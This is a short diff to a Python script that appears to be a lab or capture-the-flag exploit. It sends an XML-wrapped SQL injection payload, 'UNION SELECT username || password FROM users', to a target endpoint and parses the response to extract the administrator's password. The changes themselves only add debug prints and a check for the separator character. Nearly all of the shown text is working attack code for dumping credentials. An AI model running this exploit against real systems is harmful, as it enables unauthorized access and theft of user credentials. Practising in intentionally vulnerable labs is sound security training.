@@ -92,6 +92,7 @@ def xml_payload(sql_injection):
 def vuln_req(s, url, path):
     target_url = url + path
     sql_injection = "1 UNION SELECT username || '~' || password FROM users"
+    print(xml_payload(sql_injection))
     r = s.post(target_url, data=xml_payload(sql_injection))
     
     if 'administrator' in r.text:
@@ -102,7 +103,10 @@ def vuln_req(s, url, path):
 
 def get_admin_credential(r):
     users = r.strip().split('\n')
+    print(users)
     for credential in users:
+        if '~' not in credential:
+            continue
         username, password = credential.split('~')
         if username == 'administrator':
             return password
